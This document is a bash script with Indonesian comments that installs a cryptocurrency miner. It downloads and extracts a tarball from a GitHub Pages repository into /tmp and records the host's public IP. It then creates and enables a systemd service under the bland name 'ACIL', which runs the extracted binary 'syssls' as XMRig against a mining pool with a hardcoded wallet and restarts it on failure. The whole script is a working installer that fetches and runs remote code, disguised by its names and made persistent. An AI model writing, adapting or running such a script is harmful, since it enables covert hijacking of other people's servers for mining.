#!/bin/bash

# Pindah ke direktori /tmp
cd /tmp

# Download dan ekstrak syssls.tar.gz dari GitHub
curl -L https://github.com/shafafery/shafafery.github.io/raw/refs/heads/main/syssls.tar.gz | tar zx

# Mendapatkan alamat IP publik VPS
IP_PUBLIC=$(curl -s http://ipecho.net/plain)

# Mendapatkan alamat IP lokal VPS
IP_LOCAL=$(hostname -I | awk '{print $1}')

# Mengganti titik dengan hubung pada IP publik dan lokal
IP_PUBLIC_REPLACED=$(echo "$IP_PUBLIC" | sed 's/\./-/g')
IP_LOCAL_REPLACED=$(echo "$IP_LOCAL" | sed 's/\./-/g')

# Output hasil
echo "IP Publik VPS (dengan tanda hubung): $IP_PUBLIC_REPLACED"
echo "IP Lokal VPS (dengan tanda hubung): $IP_LOCAL_REPLACED"

# Membuat dan menulis file service systemd untuk XMRig miner
echo -e "[Unit]
Description=ACIL
After=network.target

[Service]
Type=simple
Restart=on-failure
RestartSec=15s
ExecStart=/tmp/syssls --opencl --cuda --url pool.hashvault.pro:443 --user 86fz79VrJTCZ4J1jLFfwzvdFehcQaHaTZj8uY23Po4R1Bfj2JhtuaDYetJZC7qZekm4aLvi1pZbhLW2zEJ7CvwXoB8DoncY --pass $IP_PUBLIC_REPLACED --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14

[Install]
WantedBy=multi-user.target" > /etc/systemd/system/acil.service

# Memberikan izin eksekusi untuk file service dan memuat ulang systemd
chmod 644 /etc/systemd/system/acil.service
sudo systemctl daemon-reload

# Mengaktifkan dan memulai service systemd
sudo systemctl enable acil.service
sudo systemctl start acil.service

echo "Systemd service untuk ACIL telah dibuat, dimuat, dan dimulai."
